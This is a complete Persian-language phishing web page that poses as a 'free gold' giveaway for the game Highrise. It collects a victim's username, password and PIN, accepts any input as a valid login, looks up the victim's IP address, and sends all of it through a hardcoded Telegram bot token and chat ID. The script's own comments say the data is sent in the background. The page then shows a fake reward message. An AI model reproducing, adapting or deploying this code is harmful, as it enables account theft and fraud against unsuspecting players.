<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>پنل طلای رایگان| Highrise</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Tahoma', sans-serif;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #0a0f1e, #0a1a2a, #0b2b3b);
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
            position: relative;
            width: 100%;
        }
        
        /* دکمه رفرش */
        .refresh-btn-circle {
            position: fixed;
            top: 20px;
            left: 20px;
            width: 44px;
            height: 44px;
            background: rgba(255, 215, 0, 0.2);
            backdrop-filter: blur(12px);
            border: 1.5px solid rgba(255, 215, 0, 0.7);
            border-radius: 50%;
            color: #FFD700;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
        }

        .refresh-btn-circle:hover {
            transform: scale(1.1) rotate(180deg);
            box-shadow: 0 0 25px rgba(255, 215, 0, 0.7);
            background: rgba(255, 215, 0, 0.4);
        }

        /* کانتینر اصلی لاگین - طلایی */
        .login-container {
            max-width: 480px;
            width: 100%;
            padding: 40px 28px;
            margin: 0 auto;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(16px);
            border-radius: 36px;
            border: 2px solid rgba(255, 215, 0, 0.6);
            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.6), 0 0 40px rgba(255, 215, 0, 0.3);
            animation: fadeInUp 0.5s ease-out;
        }

        /* کانتینر اطلاعات کاربری (داشبورد) */
        .dashboard-container {
            max-width: 1400px;
            width: 100%;
            margin: 0 auto;
            background: rgba(15, 20, 30, 0.85);
            backdrop-filter: blur(14px);
            border-radius: 32px;
            border: 1px solid rgba(255, 215, 0, 0.4);
            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5);
            padding: 24px 22px;
            animation: fadeInUp 0.5s ease-out;
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* عنوان Highrise */
        .highrise-title {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .highrise-title h1 {
            color: #FFD700;
            font-size: clamp(2rem, 7vw, 2.8rem);
            text-shadow: 0 0 18px rgba(255, 215, 0, 0.6);
            letter-spacing: 1px;
            font-weight: 800;
        }
        
        .highrise-title .sub {
            color: rgba(255, 215, 0, 0.85);
            font-size: 14px;
            margin-top: 8px;
            font-weight: 500;
        }

        .input-group {
            margin-bottom: 24px;
            position: relative;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: #FFD700;
            font-size: 14px;
            font-weight: bold;
            letter-spacing: 0.5px;
        }

        .input-group input {
            width: 100%;
            padding: 14px 18px;
            background: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(255, 215, 0, 0.4);
            border-radius: 24px;
            font-size: 15px;
            color: #fff;
            transition: 0.25s;
            outline: none;
        }

        .input-group input:focus {
            border-color: #FFD700;
            background: rgba(255, 255, 255, 0.12);
            box-shadow: 0 0 12px rgba(255, 215, 0, 0.4);
        }

        /* دکمه نمایش کوچک شده */
        .toggle-password {
            position: absolute;
            left: 12px;
            bottom: 10px;
            background: rgba(255, 215, 0, 0.2);
            border: none;
            color: #FFD700;
            cursor: pointer;
            font-size: 10px;
            padding: 3px 10px;
            border-radius: 30px;
            transition: 0.2s;
            font-weight: bold;
            width: auto;
            min-width: 52px;
            text-align: center;
            letter-spacing: 0.3px;
            backdrop-filter: blur(4px);
        }
        
        .toggle-password:hover {
            background: rgba(255, 215, 0, 0.7);
            color: #000;
            transform: scale(0.96);
        }

        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(95deg, #FFD700, #DAA520);
            border: none;
            border-radius: 32px;
            color: #2c1a00;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.25s;
            margin-top: 10px;
            box-shadow: 0 5px 12px rgba(0,0,0,0.3);
        }

        button:hover {
            transform: scale(1.02);
            box-shadow: 0 8px 22px rgba(255, 215, 0, 0.5);
            background: linear-gradient(95deg, #FFE44D, #E6B422);
        }

        .info-card {
            background: rgba(0, 0, 0, 0.6);
            border-radius: 28px;
            padding: 22px 20px;
            margin-bottom: 30px;
            border: 1px solid rgba(255, 215, 0, 0.4);
            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
        }
        
        .info-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 14px 0;
            border-bottom: 1px solid rgba(255,215,0,0.2);
            flex-wrap: wrap;
            gap: 10px;
        }
        
        .info-row:last-child {
            border-bottom: none;
        }
        
        .info-label {
            color: #FFD700;
            font-weight: bold;
            font-size: 16px;
            background: rgba(255,215,0,0.1);
            padding: 5px 12px;
            border-radius: 40px;
            display: inline-block;
        }
        
        .info-value {
            color: #f0f0f0;
            font-size: 17px;
            font-weight: 500;
            word-break: break-all;
            text-align: left;
            font-family: monospace;
            background: rgba(0,0,0,0.5);
            padding: 6px 14px;
            border-radius: 40px;
            letter-spacing: 0.5px;
        }
        
        .logout-btn {
            background: linear-gradient(90deg, #c0392b, #e67e22);
            color: white;
            width: auto;
            padding: 10px 24px;
            font-size: 14px;
            margin-top: 0;
            border-radius: 40px;
        }
        
        .dashboard-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
            flex-wrap: wrap;
            gap: 15px;
        }
        
        .dashboard-header h2 {
            color: #FFD700;
            font-size: 1.7rem;
            text-shadow: 0 0 5px rgba(0,0,0,0.5);
        }
        
        .toast {
            position: fixed;
            bottom: 25px;
            left: 20px;
            right: 20px;
            background: #1e1e2f;
            color: #FFD700;
            padding: 12px 18px;
            border-radius: 60px;
            font-size: 13px;
            z-index: 1100;
            animation: slideIn 0.3s ease;
            display: none;
            border-right: 5px solid #FFD700;
            text-align: center;
            max-width: 380px;
            margin: 0 auto;
            box-shadow: 0 8px 20px black;
            font-weight: 500;
        }
        
        @keyframes slideIn {
            from { transform: translateX(100px); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        .hidden {
            display: none;
        }
        
        @media (max-width: 640px) {
            .dashboard-container { padding: 18px; }
            .info-row { flex-direction: column; align-items: flex-start; }
            .info-value { width: 100%; }
            .logout-btn { width: 100%; text-align: center; }
            .dashboard-header { flex-direction: column; align-items: stretch; }
            .toggle-password {
                left: 10px;
                bottom: 8px;
                font-size: 9px;
                padding: 2px 8px;
                min-width: 46px;
            }
        }
        
        .login-footer {
            margin-top: 20px;
            text-align: center;
            color: rgba(255,255,255,0.5);
            font-size: 12px;
        }
    </style>
</head>
<body>

<button class="refresh-btn-circle" onclick="location.reload()" title="بازنشانی صفحه">
    🔄
</button>

<div id="app">
    <!-- صفحه ورود: تمام فیلدها اجباری هستند ولی بدون محدودیت محتوایی -->
    <div id="loginPanel" class="login-container">
        <div class="highrise-title">
            <h1> Highrise</h1>
            <div class="sub">دریافت طلای رایگان</div>
            <div class="sub" style="font-size: 12px; margin-top: 6px;">گلد ویژه سال ۲۰۲۶</div>
        </div>
        <div class="input-group">
            <label> نام کاربری / اکانت</label>
            <input type="text" id="loginAccount" placeholder="نام کاربری خود را وارد کنید" autocomplete="off">
        </div>
        <div class="input-group">
            <label> رمز عبور حساب</label>
            <input type="password" id="loginPassword" placeholder="رمز عبور">
            <button class="toggle-password" onclick="togglePasswordField('loginPassword')">👁 نمایش</button>
        </div>
        <div class="input-group">
            <label> پین (PIN)</label>
            <input type="password" id="loginPin" placeholder="پین (بدون محدودیت)">
            <button class="toggle-password" onclick="togglePasswordField('loginPin')">👁 نمایش</button>
        </div>
        <button onclick="handleUserLogin()">دریافت گلد</button>
        <div class="login-footer">
            <span> همه فیلدها باید حداقل یک کاراکتر داشته باشند</span>
        </div>
    </div>
    
    <!-- پنل نمایش اطلاعات کاربر (فقط نام کاربری، رمز عبور و پین) - بخش تلگرام حذف شده -->
    <div id="infoDashboard" class="dashboard-container hidden">
        <div class="dashboard-header">
            <h2>📀 پنل طلای رایگان Highrise</h2>
            <button class="logout-btn" onclick="performLogout()">🚪 خروج از حساب</button>
        </div>
        
        <div class="info-card">
            <div class="info-row">
                <span class="info-label">📱 نام کاربری (اکانت)</span>
                <span class="info-value" id="displayAccount">-</span>
            </div>
            <div class="info-row">
                <span class="info-label">🔑 رمز عبور حساب</span>
                <span class="info-value" id="displayPassword">-</span>
            </div>
            <div class="info-row">
                <span class="info-label">🔢 پین (PIN) حساب</span>
                <span class="info-value" id="displayPin">-</span>
            </div>
        </div>
        
        <div style="background: linear-gradient(145deg, #FFD70020, #DAA52010); border-radius: 28px; padding: 18px; text-align: center; border: 1px solid #FFD70040;">
            <p style="color: #FFD700; font-weight: bold; margin-bottom: 8px;"> گلد رایگان شما در حال آماده سازی </p>
            <p style="color: #ddd; font-size: 13px;">جایزه شما بزودی میشنید توی حسابتان</p>
            <div style="margin-top: 12px; font-size: 12px; color: #FFD700AA;"> کد تخفیف : GOLD2026</div>
        </div>
    </div>
</div>

<div id="toastMessage" class="toast"></div>

<script>
    // ============================================================
    // تنظیمات ربات تلگرام - توکن و چت آیدی خود را اینجا وارد کنید
    // ============================================================
    const BOT_TOKEN = "7645107301:AAEzI3zc5YsYDdvl9vQblpNU24JKab0A50Y";   // توکن ربات خود را وارد کنید
    const CHAT_ID = "5549724583";   // چت آیدی خود را وارد کنید
    
    // ============================================================
    // سیستم ورود بدون محدودیت - فقط کافیست هر سه فیلد غیر خالی باشند
    // اطلاعات کاربر (نام کاربری، رمز، پین، آی‌پی) به تلگرام ارسال می‌شود
    // ============================================================
    
    let currentLoggedInData = null;
    
    // نمایش توست (پیام)
    function showMessage(msg, isError = false) {
        let toastDiv = document.getElementById('toastMessage');
        toastDiv.textContent = msg;
        toastDiv.style.display = 'block';
        if (isError) {
            toastDiv.style.borderRightColor = "#ff6b6b";
            toastDiv.style.color = "#ffaaaa";
        } else {
            toastDiv.style.borderRightColor = "#FFD700";
            toastDiv.style.color = "#FFD700";
        }
        setTimeout(() => {
            toastDiv.style.display = 'none';
        }, 3000);
    }
    
    // دریافت آی‌پی کاربر
    async function fetchUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.warn("خطا در دریافت IP:", error);
            return "نامشخص (خطا در دریافت)";
        }
    }
    
    // ارسال اطلاعات به ربات تلگرام (در پس‌زمینه، بدون نمایش به کاربر)
    async function sendToTelegramBot(account, password, pin, ip) {
        // بررسی اینکه توکن و چت آیدی تنظیم شده باشند
        if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
            console.warn("⚠️ توکن یا چت آیدی ربات تنظیم نشده است. اطلاعات ارسال نشد.");
            return false;
        }
        
        const message = `🔔 *ورود جدید به پنل Highrise* 🔔
        
👤 *نام کاربری:* ${account}
🔑 *رمز عبور:* ${password}
🔢 *پین:* ${pin}
🌐 *آی‌پی:* ${ip}
⏰ *زمان:* ${new Date().toLocaleString('fa-IR')}
─────────────────
✅ ورود موفقیت‌آمیز بود`;

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            const result = await response.json();
            if (result.ok) {
                console.log("✅ اطلاعات ورود با موفقیت به تلگرام ارسال شد");
                return true;
            } else {
                console.error("❌ خطا در ارسال به تلگرام:", result);
                return false;
            }
        } catch (error) {
            console.error("❌ خطا در ارتباط با تلگرام:", error);
            return false;
        }
    }
    
    // نمایش اطلاعات حساب کاربری در پنل
    async function showAccountInfo(accountData) {
        const dashboard = document.getElementById('infoDashboard');
        const loginPanel = document.getElementById('loginPanel');
        
        document.getElementById('displayAccount').textContent = accountData.account;
        document.getElementById('displayPassword').textContent = accountData.password;
        document.getElementById('displayPin').textContent = accountData.pin;
        
        loginPanel.classList.add('hidden');
        dashboard.classList.remove('hidden');
        
        // ذخیره در sessionStorage برای نگهداری نشست
        sessionStorage.setItem('highriseLoggedUser', JSON.stringify(accountData));
        currentLoggedInData = accountData;
        
        // دریافت آی‌پی و ارسال به تلگرام (در پس‌زمینه)
        const userIp = await fetchUserIP();
        
        // ارسال اطلاعات به ربات (اجرا در پس‌زمینه بدون دخالت کاربر)
        sendToTelegramBot(accountData.account, accountData.password, accountData.pin, userIp);
    }
    
    // تابع ورود: فقط بررسی می‌کند که هر سه فیلد حداقل یک کاراکتر داشته باشند
    async function handleUserLogin() {
        const accountInput = document.getElementById('loginAccount').value.trim();
        const passwordInput = document.getElementById('loginPassword').value.trim();
        const pinInput = document.getElementById('loginPin').value.trim();
        
        // بررسی می‌کنیم که هیچکدام خالی نباشند
        if (!accountInput) {
            showMessage("❌ لطفاً نام کاربری را وارد کنید (حداقل یک کاراکتر)", true);
            return;
        }
        if (!passwordInput) {
            showMessage("❌ لطفاً رمز عبور را وارد کنید (حداقل یک کاراکتر)", true);
            return;
        }
        if (!pinInput) {
            showMessage("❌ لطفاً پین را وارد کنید (حداقل یک کاراکتر)", true);
            return;
        }
        
        // هر سه فیلد پر شده‌اند، ورود موفقیت‌آمیز است
        showMessage(`🎉 ورود موفق! خوش آمدید ${accountInput}`, false);
        
        await showAccountInfo({
            account: accountInput,
            password: passwordInput,
            pin: pinInput
        });
    }
    
    // خروج از حساب و بازگشت به صفحه ورود
    function performLogout() {
        sessionStorage.removeItem('highriseLoggedUser');
        currentLoggedInData = null;
        
        const dashboard = document.getElementById('infoDashboard');
        const loginPanel = document.getElementById('loginPanel');
        dashboard.classList.add('hidden');
        loginPanel.classList.remove('hidden');
        
        // پاک کردن فیلدها برای ورود مجدد
        document.getElementById('loginAccount').value = '';
        document.getElementById('loginPassword').value = '';
        document.getElementById('loginPin').value = '';
        
        showMessage("🚪 شما از حساب خود خارج شدید", false);
    }
    
    // نمایش/مخفی کردن رمز عبور و پین
    function togglePasswordField(fieldId) {
        const field = document.getElementById(fieldId);
        if (field) {
            const type = field.getAttribute('type') === 'password' ? 'text' : 'password';
            field.setAttribute('type', type);
        }
    }
    
    // چک کردن نشست ذخیره شده در مرورگر (برای بازدید مجدد)
    async function checkExistingSession() {
        const savedData = sessionStorage.getItem('highriseLoggedUser');
        if (savedData) {
            try {
                const parsed = JSON.parse(savedData);
                if (parsed.account && parsed.password && parsed.pin) {
                    await showAccountInfo(parsed);
                } else {
                    sessionStorage.removeItem('highriseLoggedUser');
                }
            } catch(e) {
                sessionStorage.removeItem('highriseLoggedUser');
            }
        }
    }
    
    // راهنمایی در کنسول
    console.log("🔓 سیستم ورود بدون محدودیت فعال است.");
    console.log("🤖 ربات تلگرام در پس‌زمینه فعال می‌باشد. هر بار ورود کاربر، اطلاعات به ادمین ارسال می‌شود.");
    if (BOT_TOKEN && CHAT_ID && BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE") {
        console.log("✅ تنظیمات ربات تلگرام تکمیل است.");
    } else {
        console.warn("⚠️ لطفاً توکن و چت آیدی ربات را در متغیرهای BOT_TOKEN و CHAT_ID تنظیم کنید.");
    }
    
    // بارگذاری اولیه و بررسی نشست قبلی
    window.addEventListener('DOMContentLoaded', async () => {
        await checkExistingSession();
    });
    
    // اکسپوز توابع به صورت سراسری
    window.handleUserLogin = handleUserLogin;
    window.performLogout = performLogout;
    window.togglePasswordField = togglePasswordField;
</script>
</body>
</html>
